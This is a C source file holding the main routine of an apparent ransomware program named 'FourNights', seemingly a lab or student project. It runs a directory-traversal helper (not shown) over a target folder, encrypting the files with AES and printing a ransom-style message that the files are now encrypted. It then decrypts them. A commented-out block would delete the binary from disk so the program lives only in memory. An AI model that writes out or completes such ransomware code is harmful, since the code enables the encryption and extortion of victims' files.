#include "fournights.h"
/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(int argc, char *argv[])
{
	unsigned char salt[16];
	struct file_filter_s file_filter;
	EVP_CIPHER_CTX encrypt;
	EVP_CIPHER_CTX decrypt;

	if (argc == 1)
		init_struct(&file_filter, "/home/vagrant/FourNights/TESTS/");
	else
		init_struct(&file_filter, argv[1]);

	/* ENCRYPT */
	/*
	getcwd(file_filter.tmp_bufs->filepath, BIGBUF);
	my_strncat(file_filter.tmp_bufs->filepath, argv[0] + 1, my_strlen(file_filter.tmp_bufs->filepath), my_strlen(argv[0]) - 1);
	unlink(file_filter.tmp_bufs->filepath); delete me from the OS, i will now live in memory */

	RAND_bytes(salt, 16);
	aes_encrypt_init((unsigned char *)file_filter.key, my_strlen(file_filter.key), (unsigned char *)&salt, &encrypt);
	file_filter.tmp_bufs->cipher = &encrypt;
	/* Walk through directory TODO: Change name of function */
	traverse_dir((char *)file_filter.root_path, &file_filter);
	printf("Your Files are now encrypted. Please enter the password (press enter)\n");
	getchar();
	/* DECRYPT */
	printf("######################\nStarting to decrypt!\n######################\n");
	file_filter.cipher_flag = 'd';
	if (aes_decrypt_init(&decrypt) == -1)
	{
		printf("Could not decrypt your data, sorry.\n");
	}
	file_filter.tmp_bufs->cipher = &decrypt;
	/* reset file extension tokens */
	my_strncat(file_filter.file_exts_whole_str, ".betty\0", 0, 7);
	file_filter.file_extensions[1] = NULL;

	traverse_dir((char *)file_filter.root_path, &file_filter);

	EVP_CIPHER_CTX_cleanup(&encrypt); /* TODO: call after encryption */
	EVP_CIPHER_CTX_cleanup(&decrypt);
	free_file_filter_struct(&file_filter);
	return (EXIT_SUCCESS);
}
